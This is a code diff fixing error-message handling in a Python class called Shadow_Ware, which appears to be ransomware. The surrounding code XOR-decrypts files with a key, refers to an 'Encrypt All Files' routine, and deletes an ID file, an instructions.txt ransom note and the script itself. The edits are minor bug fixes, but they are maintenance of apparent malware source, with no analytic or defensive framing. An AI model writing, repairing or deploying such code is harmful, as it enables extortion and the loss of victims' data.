@@ -55,7 +55,7 @@ class Shadow_Ware():
           with open(input_file, "rb") as file:
               encrypted_data = file.read()
       except Exception as e:
-          print(f"Failed to read {input_file} because {e}")
+          print(f"Failed to read {input_file} because {str(e)}")
 
       # Decrypting file data
       try:
@@ -63,13 +63,13 @@ class Shadow_Ware():
         for i in range(len(encrypted_data)):
             decrypted_data[i] = encrypted_data[i] ^ self.bytes_key[i % len(self.bytes_key)]
       except Exception as e:
-         print(f"Failed to decrypt data of {input_file} because {e}")
+         print(f"Failed to decrypt data of {input_file} because {str(e)}")
 
       try:
         with open(output_file, "wb") as file:
             file.write(decrypted_data)
       except Exception as e:
-        print(f"Failed to write data to {output_file} because {e}")
+        print(f"Failed to write data to {output_file} because {str(e)}")
 
 
   # Encrypt All Files
@@ -97,11 +97,11 @@ class Shadow_Ware():
     try:
       os.remove(os.path.abspath("ID.id"))
     except Exception as e:
-      print("Failed to remove ID.id for " + e)
+      print("Failed to remove ID.id for " + str(e))
     try:
         os.remove(os.path.abspath("instructions.txt"))
     except Exception as e:
-      print("Failed to remove instructions.txt for " + e)
+      print("Failed to remove instructions.txt for " + str(e))
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
